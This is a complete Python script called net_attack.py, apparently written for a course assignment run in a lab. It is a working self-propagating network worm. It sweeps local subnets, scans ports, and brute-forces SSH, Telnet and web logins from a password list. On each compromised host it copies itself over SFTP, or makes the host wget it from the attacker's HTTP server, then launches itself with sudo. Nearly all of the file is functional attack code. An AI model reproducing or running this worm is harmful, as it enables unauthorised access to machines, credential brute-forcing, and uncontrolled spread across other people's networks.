#!/usr/bin/python3
import concurrent.futures

from scapy.all import *
from os import path
from shutil import copyfile, rmtree
from telnetlib import Telnet
from paramiko import SSHClient, AutoAddPolicy, SSHException, AuthenticationException
from requests import get, post
from http.server import HTTPServer, SimpleHTTPRequestHandler

conf.verb = 0

# OUTPUTS
LOGIN_PROMPT = "login:"
PASSWORD_PROMPT = "Password:"
WELCOME_OUTPUT = "Welcome to"
SUDO_CHECK_OUTPUT = "27(sudo)"
SAVED_OUTPUT = "saved"
SUDO_PROMPT = "[sudo] password for %s:"
WAIT_FOR_PROMPT = "WAIT FOR"

# INPUTS
SINGLE_VALUE_INPUT = "%s\n"
ID_INPUT = "id\n"
CD_INPUT = "cd %s\n"
REMOVE_OLD_FILE_INPUT = "[ -f %s ] && rm %s\n"
WGET_IF_NOT_PRESENT_INPUT = "[ ! -f %s ] && wget %s:%d/%s -q -o /dev/null\n"
CHMOD_INPUT = "sudo -S chmod +x %s\n"
START_SCRIPT_INPUT = "sudo nohup ./%s -u %s -p 22,23 -f %s -L -P >/dev/null 2>&1 &\n"

# NAMES OF FILES & DIRECTORIES CREATED
DEPLOYMENT_FILENAME = ".deploy"
SCRIPT_FILENAME = "net_attack.py"
DEPLOYMENT_DIRECTORY_NAME = "net_attack_deployment"


def main():
    arguments = sys.argv[1:]
    number_of_arguments = len(arguments)
    if number_of_arguments < 8 or "-p" not in arguments or "-u" not in arguments or "-f" not in arguments:
        help("Incorrect arguments provided")

    ports = get_parameter(arguments, "-p")
    port_list = get_ports_from_input(ports)

    username = get_parameter(arguments, "-u")

    password_file = get_parameter(arguments, "-f")
    verify_file_exists(password_file)
    password_list = read_file_from_list(password_file)

    self_propagate = False
    deploy_file = False

    ip_list = []
    print("[+] Determining which IP addresses are reachable...")
    if "-t" in arguments:
        if "-L" in arguments or "-P" in arguments:
            help("-t argument cannot be used with -L and -P")

        ip_file = get_parameter(arguments, "-t")
        verify_file_exists(ip_file)
        ip_list = read_file_from_list(ip_file)
        ip_list = [ip for ip in ip_list if is_reachable(ip)]
    elif "-L" in arguments and "-P" in arguments:
        self_propagate = True
        ip_list = scan_for_active_ips()
        deploy_file_to_server(password_file)
        deploy_file = True
    else:
        help("Missing target argument")

    if not ip_list:
        print("[!] No reachable IP addresses found.")
        exit()

    if "-d" in arguments:
        if self_propagate:
            help("-d argument cannot be used with -L and -P")
        deployment_file = get_parameter(arguments, "-d")
        verify_file_exists(deployment_file)
        deploy_file_to_server(deployment_file)
        deploy_file = True

    print("[+] Received %d response(s). Beginning attack!\n" % len(ip_list))
    for ip in ip_list:
        deployed = False
        print("********** %s **********" % ip)
        for port in port_list:
            port_open = scan_port(ip, port)
            print("Port %d is %s on %s" % (port, "open" if port_open else "closed", ip))
            if port_open:
                try:
                    bruteforce_function = {
                        22: bruteforce_ssh,
                        23: bruteforce_telnet,
                        80: bruteforce_web,
                        8080: bruteforce_web,
                        8888: bruteforce_web
                    }[port]

                    username_password = bruteforce_function(ip, port, username, password_list)
                    if username_password:
                        print("Successfully logged into port %d with %s" % (port, username_password))
                        if deploy_file and not deployed and (port == 22 or port == 23):
                            credentials = username_password.split(":")
                            deployed = transfer_file(ip, credentials[0], credentials[1], port, self_propagate)
                    else:
                        print("Bruteforce failed")
                except KeyError:
                    pass

        print("********** %s **********\n" % ip)


# Scans to see if a specified port is open for a specified ip.
# Return True if open False if closed or no response received
def scan_port(ip, port):
    pkt = IP(dst=ip) / TCP(dport=port, flags="S")
    ans, unans = sr(pkt, timeout=2)
    if len(ans) > 0:
        return "S" in str(ans[0][1][TCP].flags)
    else:
        return False


# Tries to bruteforce into a specified IP using SSH with a particular username and a list of passwords.
# Return "username:password" if successful otherwise an empty string
def bruteforce_ssh(ip, port, username, passwords):
    print("Attempting bruteforce with SSH")
    response = ""
    for password in passwords:
        try:
            client = SSHClient()
            client.set_missing_host_key_policy(AutoAddPolicy())
            client.connect(ip, username=username, password=password, port=port, timeout=3)
            response = "%s:%s" % (username, password)
            break
        except AuthenticationException:
            pass
        except (SSHException, socket.error):
            return response
        finally:
            client.close()

    return response


# Tries to bruteforce into a specified IP using Telnet with a particular username and a list of passwords.
# Return "username:password" if successful otherwise an empty string
def bruteforce_telnet(ip, port, username, passwords):
    print("Attempting bruteforce with Telnet")
    response = ""

    login_prompt = encode_in_ascii(LOGIN_PROMPT)
    username_input = encode_in_ascii(SINGLE_VALUE_INPUT % username)
    password_prompt = encode_in_ascii(PASSWORD_PROMPT)
    welcome_output = encode_in_ascii(WELCOME_OUTPUT)

    for password in passwords:
        connection = Telnet(ip, port=port)
        connection.read_until(login_prompt)
        connection.write(username_input)
        connection.read_until(password_prompt)
        connection.write(encode_in_ascii("%s\n" % password))
        banner = connection.read_until(welcome_output, timeout=1)
        if welcome_output in banner:
            connection.close()
            response = "%s:%s" % (username, password)
            break

        connection.close()

    return response


# Tries to bruteforce into a specified IPs web application with a particular username and a list of passwords.
# Return "username:password" if successful otherwise an empty string
def bruteforce_web(ip, port, username, passwords):
    print("Attempting bruteforce to Web Server")
    response = ""
    base_url = "http://%s:%d" % (ip, port)
    index_url = "%s/index.php" % base_url
    login_url = "%s/login.php" % base_url
    for password in passwords:
        # Checks to see if the IP has an index.php file, implying it's a web application
        index_response = get(index_url)
        if index_response.status_code == 200:
            # Sends a HTTP POST to the application login.php page. Response will have the text 'Welcome' if the
            # credentials successfully logged in
            login_response = post(login_url, data={"username": username, "password": password})
            if "Welcome" in login_response.text:
                response = "%s:%s" % (username, password)

    return response


# Transfers a file to a specified IP address with it's known username and password. Based on the port shown to be
# open the file will be transferred over SFTP or HTTP.
# Return True if the file(s) were deployed successfully False otherwise
def transfer_file(ip, username, password, port, self_propagate):
    target_directory = get_target_directory(ip, username)
    try:
        transfer_file_function = {
            22: transfer_file_with_sftp,
            23: transfer_file_with_http_server
        }[port]
    except KeyError:
        return False

    successful = transfer_file_function(ip, username, password, target_directory, self_propagate)

    if self_propagate:
        information_message = "Success! %s started on %s" % (SCRIPT_FILENAME, ip) if successful else "Self propagation failed\n"
    else:
        information_message = "File deployment successful!" if successful else "File deployment failed\n"

    print(information_message)
    return successful


# Transfers a file using SFTP. Will either deploy a single file if -d option is used otherwise -P and -L is used
# and the script will deploy itself and it's attached file (password file). If using the self propagation feature and
# the provided user is found to not have sudo access then the function will terminate.
# Return True if the file was successfully transferred (and deployed if self propagation) False otherwise
def transfer_file_with_sftp(ip, username, password, target_directory, self_propagate):
    information_message = "Attempting self propagation with SFTP..." if self_propagate else "Deploying file with SFTP..."
    sftp_port = 22
    print(information_message)
    client = SSHClient()
    try:
        client.set_missing_host_key_policy(AutoAddPolicy())
        client.connect(ip, username=username, password=password, port=sftp_port)
        with client.open_sftp() as sftp_client:
            local_dir = os.getcwd()

            local_deployment_path = "%s/%s" % (local_dir, DEPLOYMENT_FILENAME)
            local_script_path = "%s/%s" % (local_dir, SCRIPT_FILENAME)
            target_deployment_path = "%s/%s" % (target_directory, DEPLOYMENT_FILENAME)
            target_script_path = "%s/%s" % (target_directory, SCRIPT_FILENAME)

            sftp_client.chdir(target_directory)
            dir_contents = sftp_client.listdir()
            if DEPLOYMENT_FILENAME in dir_contents:
                if not self_propagate:
                    sftp_client.remove(target_deployment_path)
                    sftp_client.put(localpath=local_deployment_path, remotepath=target_deployment_path)
            else:
                sftp_client.put(localpath=local_deployment_path, remotepath=target_deployment_path)

            if self_propagate:
                if SCRIPT_FILENAME in dir_contents:
                    return True

                sftp_client.put(localpath=local_script_path, remotepath=target_script_path)

                channel = client.invoke_shell()

                sudo = send_command_over_channel(channel, command=ID_INPUT, check_output=True, output=SUDO_CHECK_OUTPUT)
                if not sudo:
                    return False

                commands = [
                    CD_INPUT % target_directory,
                    CHMOD_INPUT % SCRIPT_FILENAME,
                    SINGLE_VALUE_INPUT % password,
                    START_SCRIPT_INPUT % (SCRIPT_FILENAME, username, DEPLOYMENT_FILENAME)
                ]

                for command in commands:
                    send_command_over_channel(channel, command)

                channel.close()

        return True
    except Exception as ex:
        print(ex)
        return False
    finally:
        client.close()


# Transfers a file using HTTP. Will either deploy a single file if -d option is used otherwise -P and -L is used
# and the script will deploy itself and it's attached file (password file). If using the self propagation feature and
# the provided user is found to not have sudo access then the function will terminate.
# Return True if the file was successfully transferred (and deployed if self propagation) False otherwise
def transfer_file_with_http_server(ip, username, password, target_directory, self_propagate):
    information_message = "Attempting self propagation with HTTP..." if self_propagate else "Deploying file with HTTP..."
    print(information_message)

    telnet_port = 23

    server_ip = get_server_ip_from_ip(ip)
    port_number = get_server_port_number()

    login_prompt = encode_in_ascii(LOGIN_PROMPT)
    username_input = encode_in_ascii(SINGLE_VALUE_INPUT % username)
    password_prompt = encode_in_ascii(PASSWORD_PROMPT)
    password_input = encode_in_ascii(SINGLE_VALUE_INPUT % password)
    welcome_output = encode_in_ascii(WELCOME_OUTPUT)

    sudo_check = encode_in_ascii(ID_INPUT)
    sudo_check_response = encode_in_ascii(SUDO_CHECK_OUTPUT)

    saved = encode_in_ascii(SAVED_OUTPUT)
    cd_command = encode_in_ascii(CD_INPUT % target_directory)

    remove_deploy_if_exists_command = encode_in_ascii(REMOVE_OLD_FILE_INPUT % (DEPLOYMENT_FILENAME, DEPLOYMENT_FILENAME))

    wget_deployment_file_command = encode_in_ascii(WGET_IF_NOT_PRESENT_INPUT % (DEPLOYMENT_FILENAME, server_ip, port_number, DEPLOYMENT_FILENAME))
    wget_script_file_command = encode_in_ascii(WGET_IF_NOT_PRESENT_INPUT % (SCRIPT_FILENAME, server_ip, port_number, SCRIPT_FILENAME))

    chmod_command = encode_in_ascii(CHMOD_INPUT % SCRIPT_FILENAME)
    sudo_prompt = encode_in_ascii(SUDO_PROMPT % username)

    start_net_attack_command = encode_in_ascii(START_SCRIPT_INPUT % (SCRIPT_FILENAME, username, DEPLOYMENT_FILENAME))
    wait_for = encode_in_ascii(WAIT_FOR_PROMPT)

    connection = Telnet(ip, port=telnet_port)
    connection.read_until(login_prompt)
    connection.write(username_input)
    connection.read_until(password_prompt)
    connection.write(password_input)

    banner = connection.read_until(welcome_output, timeout=1)
    if welcome_output not in banner:
        return False

    connection.write(sudo_check)
    check = connection.read_until(sudo_check_response, timeout=1)
    if sudo_check_response not in check:
        return False

    connection.write(cd_command)
    if not self_propagate:
        connection.write(remove_deploy_if_exists_command)
    connection.write(wget_deployment_file_command)

    if self_propagate:
        connection.write(wget_script_file_command)
        connection.read_until(saved, timeout=1)

        connection.write(chmod_command)
        sudo_response = connection.read_until(sudo_prompt, timeout=1)
        if sudo_prompt in sudo_response:
            connection.write(password_input)
            connection.read_until(wait_for, timeout=1)
        connection.write(start_net_attack_command)

    connection.read_until(wait_for, timeout=1)
    connection.close()

    return True

# Sends a command over the provided channel. If required will check the response to the provided command to see if it
# is the expected reply.
# Return True if command successful (and output is expected if required) False otherwise
def send_command_over_channel(channel, command, check_output=False, output=None):
    try:
        channel.send(command)

        counter = 0
        while not channel.recv_ready():
            if counter >= 5:
                return False

            time.sleep(0.1)
            counter = counter + 1

        command_response = channel.recv(1024)
        if check_output and encode_in_ascii(output) not in command_response:
            return False

        time.sleep(0.1)
        return True
    except socket.error:
        return False


# Return The IP address of the host running the script on the particular interface
def get_server_ip_from_ip(ip):
    server_ip = ""

    base_ip = ip[0: (ip.rfind('.') + 1)]
    interfaces = get_if_list()
    for interface in interfaces:
        interface_ip = get_if_addr(interface)
        if base_ip in interface_ip:
            server_ip = interface_ip
            break

    return server_ip


# Reads the contents of a specified file to a list. If the provided file is empty an error message will be provided
# and the script terminated.
# Return File contents in a list
def read_file_from_list(file):
    with open(file) as reader:
        file_contents_list = reader.read().splitlines()

    if not file_contents_list:
        print("File %s did not have any content" % file)
        exit()

    return file_contents_list


# Will scan for all active IP addresses across all interfaces the attacker can see
# Return List of all IP addresses that replied
def scan_for_active_ips():
    interfaces = get_if_list()
    active_ips = []
    for interface in interfaces:
        active_ips.extend(scan_against_interface(interface))

    return active_ips


# Gets the IP Address of the interface, extracts the base IP from the interface IP i.e. XXX.YYY.ZZZ. and sends an Echo
# Request to each possible IP in the /24 Network from 1 to 254 with the base IP i.e XXX.YYY.ZZZ.1 -> XXX.YYY.ZZZ.254.
def scan_against_interface(interface):
    src_ip = get_if_addr(interface)
    base_ip = src_ip[0: (src_ip.rfind('.') + 1)]
    replies_list = []

    # Calls the send function over 20 threads. The range option will provide the final octet value for the ping request.
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        executor.map(send(src_ip, base_ip, replies_list), range(1, 255))

    return replies_list


# Return A reference to send_icmp_request
def send(src_ip, base_ip, replies_list):
    # Sends an Echo Request to the Networks base IP concatenated with a particular IP for the final octet.
    # The src_ip is set in the Echo Request as the source. If an Echo Reply is not received in 4 seconds then the
    # request times out (Timeout is longer in case of congestion when threaded).
    def send_icmp_request(last_ip_octal):
        dst_ip = base_ip + str(last_ip_octal)
        if is_reachable(dst_ip, src_ip=src_ip, timeout=4):
            replies_list.append(dst_ip)

    return send_icmp_request


# Checks if a IP address is reachable by sending out an Echo Ping. The source IP of the request and the timeout
# are optional. If no source IP is provided then scapy will figure out the source IP. If no timeout is provided
# then a timeout of 2 is set.
# Return True if the IP address replied to the Echo Ping False otherwise
def is_reachable(dst_ip, src_ip=None, timeout=2):
    ans = sr1(IP(src=src_ip, dst=dst_ip, ttl=64) / ICMP(), timeout=timeout)
    return ans is not None


# Deploys the script and provided deployment file to a HTTP server. Moves these files to a new directory to
# prevent someone having access to the directory running the script.
def deploy_file_to_server(file):
    current_directory = os.getcwd()

    current_deployment_file_location = "%s/%s" % (current_directory, file)
    current_script_file_location = "%s/%s" % (current_directory, SCRIPT_FILENAME)

    deployment_directory = "%s/%s" % (current_directory, DEPLOYMENT_DIRECTORY_NAME)

    if path.isdir(deployment_directory):
        rmtree(deployment_directory)

    os.mkdir(deployment_directory)
    os.chdir(deployment_directory)

    copyfile(current_deployment_file_location, DEPLOYMENT_FILENAME)
    copyfile(current_script_file_location, SCRIPT_FILENAME)

    port_number = get_server_port_number()
    server = ("", port_number)
    http = HTTPServer(server, SimpleHTTPRequestHandler)

    http_server_thread = threading.Thread(target=http.serve_forever, name="HTTP Server Thread")
    http_server_thread.daemon = True
    http_server_thread.start()


# Gets a particular parameter from list of arguments that was provided for an argument.
# Return Parameter if found otherwise will print an error to the command window and terminate
def get_parameter(arguments, argument):
    index = 0

    try:
        parameter_name = get_pretty_argument_name(argument)
        parameter_not_provided_message = "%s missing (%s)" % (parameter_name, argument)
    except KeyError:
        parameter_not_provided_message = "Missing parameter for %s" % argument

    if argument in arguments:
        index = arguments.index(argument)
    else:
        help("Argument %s is not provided" % argument)

    if index >= (len(arguments) - 1):
        help(parameter_not_provided_message)

    parameter = arguments[index + 1]
    if "-" in parameter:
        help(parameter_not_provided_message)

    return parameter


# Gets the pretty name for an argument
def get_pretty_argument_name(argument):
    parameter_name = {
        "-t": "IP address filename",
        "-p": "Ports",
        "-u": "Username",
        "-f": "Passwords filename",
        "-d": "Deployment filename",
        "-L": "Local Scan",
        "-P": "Propagate"
    }[argument]

    return parameter_name


# Gets the the provided ports and puts them into a sorted list.
# Return list of ports
def get_ports_from_input(ports_input):
    ports = []
    ports_input_split = ports_input.split(",")
    for port in ports_input_split:
        if port.isdigit():
            ports.append(int(port))

    if not ports:
        help("No valid ports provided")

    ports.sort()
    return ports


# Verifies that a provided file exists. If it doesn't an error will be displayed and the application terminated.
def verify_file_exists(file):
    if not path.isfile(file):
        print("Could not find file %s" % file)
        exit()


# Return The directory to deploy files to. Assumes the pattern that 10.0.0.2 => server_1, 10.0.0.3 => server_2
def get_target_directory(ip, username):
    last_ip_octal = ip[ip.rfind('.') + 1:]
    server_number = int(last_ip_octal) - 1
    return "/home/%s/assign_2/server_%d" % (username, server_number)


# Return encoded version of the String in ascii
def encode_in_ascii(s):
    return s.encode("ascii")


# Return The port number of the HTTP Server
def get_server_port_number():
    return 54325


# Will print out example usage when a user input error occurs.
def help(error_message):
    print("Error: %s\n" % error_message)
    print("Example usage:")
    print("\t./net_attack.py -t my_ip_list.txt -p 22,23,25,80 -u admin -f my_password_list.txt")
    print("\t./net_attack.py -t my_ip_list.txt -p 22 -u admin -f my_password_list.txt -d deploy.txt")
    print("\t./net_attack.py -p 22,23 -u admin -f my_password_list.txt -L -P")
    exit()


if __name__ == "__main__":
    main()
